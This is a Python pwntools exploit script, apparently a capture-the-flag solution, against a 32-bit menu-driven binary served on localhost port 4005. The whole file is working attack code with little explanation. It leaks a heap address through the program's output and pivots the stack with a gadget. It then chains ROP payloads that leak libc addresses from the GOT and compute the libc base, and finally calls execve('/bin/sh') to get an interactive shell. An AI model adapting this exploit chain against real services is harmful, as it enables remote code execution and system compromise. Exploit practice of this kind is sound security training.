from pwn import *

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./main")
libc = ELF("libc.so.6")

# io = elf.process(stdin=PIPE, stdout=PIPE, stderr=PIPE)
io = remote("127.0.0.1", 4005)


# gdb.attach(io, gdbscript = "b *0x08049772")
# input("[ENTER]")

# gadgets:
#    0x0804976c <+323>:	pop    ecx
#    0x0804976d <+324>:	pop    ebx
#    0x0804976e <+325>:	pop    ebp
#    0x0804976f <+326>:	lea    esp,[ecx-0x4]
#    0x08049772 <+329>:	ret    

main = 0x08049629
read_plt = 0x08049040
stack_pivot_gadget = 0x0804976c
user_addr = 0x0804c060

username = p32(main) + p32(read_plt)

# write username payload on heap
io.readuntil("Logout.\n")
io.send(b"2")
io.readuntil("Username: ")
io.send(username)

# Leaking the address of the user object on the heap
io.readuntil("Logout.\n")
io.send(b"4")
io.send(b"0")
friend_addr = 0
for i in range(32):
	line = io.readuntil("\n")
	if b"creds" in line: break
	if b"might" in line:
		friend_addr |= (1 << i)
print("friend@heap =", hex(friend_addr))

# Writing stack pivot gadget on return address of main() and returning
io.readuntil("Logout.\n")
io.send(b"5")

rop1 = p32(stack_pivot_gadget)
rop1 += p32(friend_addr + 4)
rop1 += b"AAAABBBB"

io.send(rop1)
io.readuntil("Logout.\n")
io.send(b"6")

# Writing rop2 to specify buffer we will read into
io.readuntil("Logout.\n")
io.send(b"5")

rop2 = p32(0)
rop2 += p32(friend_addr + 8)	# we will read into the return address at the end of read() stack frame
rop2 += b"AAAABBBB"

io.send(rop2)
io.readuntil("Logout.\n")
io.send(b"6")

GOT = 0x0804c000
puts_plt = 0x08049060
pop_ebx = 0x0804901e	# pop ebx ; ret
pop_3reg = 0x0804939a	# pop ebx ; pop esi ; pop ebp ; ret

# This ROP payload is written at address "friend + 8"
rop3 = p32(puts_plt)	# first puts() call to leak libc addresses
rop3 += p32(pop_ebx)
rop3 += p32(GOT)
rop3 += p32(puts_plt)	# second puts() call to print a large buffer and force libc buffer to flush
rop3 += p32(pop_ebx)
rop3 += p32(friend_addr + 8 + len(rop3) + 24)	# address of "A"s in the end of rop3
rop3 += p32(read_plt)
rop3 += p32(pop_3reg)	# used to clean arguments from stack and continue ROP chain (necessary in 32-bit ROP)
rop3 += p32(0)
rop3 += p32(friend_addr + 8 + len(rop3) + 8)	# reading the rest of our ROP payload
rop3 += p32(0x1000)
rop3 += b"A" * 4096	# A bunch of "A"s to make libc IO buffer flush

io.send(rop3)
io.recv(34)
GOT_leak = io.recv(16)
print("GOT leak:", GOT_leak)
libc_start_main = u32(GOT_leak[:4])
libc_read = u32(GOT_leak[4:8])
libc_malloc = u32(GOT_leak[8:12])
libc_puts = u32(GOT_leak[12:16])
print("libc_start_main, read, malloc, puts =", hex(libc_start_main), hex(libc_read), hex(libc_malloc), hex(libc_puts))

libc.address = libc_read - libc.sym["read"]
log.success("libc base = " + hex(libc.address))

# The final ROP to perform ret2libc
rop4 = p32(libc.sym["execve"]) + b"AAAA" + p32(next(libc.search(b"/bin/sh\0"))) + p32(0) + p32(0)
io.send(rop4)

io.interactive()
